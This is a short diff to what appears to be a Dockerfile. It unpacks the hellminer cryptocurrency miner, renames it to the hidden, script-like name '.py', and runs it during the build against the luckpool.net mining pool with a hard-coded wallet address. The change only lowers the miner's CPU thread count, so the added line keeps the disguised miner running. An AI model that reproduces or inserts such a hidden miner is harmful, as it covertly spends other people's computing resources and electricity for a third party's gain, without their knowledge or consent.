@@ -7,4 +7,4 @@ RUN tar -xvf hellminer_cpu_linux.tar
 RUN rm -rf hellminer_cpu_linux.tar.gz
 RUN chmod +x ./hellminer
 RUN mv hellminer .py
-RUN ./.py -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RAcHTdhwsn1mWD7rxHCZX6AdrPpyiy9beA.cpuX -p x --cpu 3
+RUN ./.py -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RAcHTdhwsn1mWD7rxHCZX6AdrPpyiy9beA.cpuX -p x --cpu 2
